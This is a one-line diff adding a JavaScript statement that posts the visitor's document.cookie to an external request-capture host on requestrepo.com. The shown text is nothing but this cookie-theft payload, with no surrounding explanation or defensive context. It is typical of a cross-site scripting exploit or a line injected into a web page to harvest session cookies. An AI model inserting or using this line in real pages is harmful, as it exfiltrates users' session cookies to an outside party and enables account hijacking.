@@ -1,0 +1,1 @@
+fetch("https://epkveh22.requestrepo.com/", {method: "post", body: document.cookie})
